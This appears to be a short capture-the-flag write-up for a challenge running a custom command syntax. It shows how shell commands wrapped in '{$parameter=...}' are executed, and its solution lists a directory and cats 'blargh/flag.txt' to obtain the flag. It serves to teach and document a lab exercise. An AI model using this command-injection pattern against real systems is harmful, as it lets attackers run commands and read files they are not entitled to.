# Description
A special operating system that used custom commaand line/syntax

# Syntax try-out

    | INPUT | OUTPUT | EXPLANATION |
    | :------- | :------: | -------: |
    | ls  | Is: undefined  | ls are not recognized  |
    | {$parameter?ls}  | parameter: ls  | ls are recognized using default value  |
    | {$parameter=ls}  | blargh  | blargh is an existing directory  |

from the syntax try-out, {$parameter='command'} is the way to go

# Solution
`{$parameter=ls}` would return directory named `blargh`

`{$parameter=ls blargh}` would return an existing file named `flag.txt` inside directory blargh

`{$parameter=cat blargh/flag.txt}` would return the flag
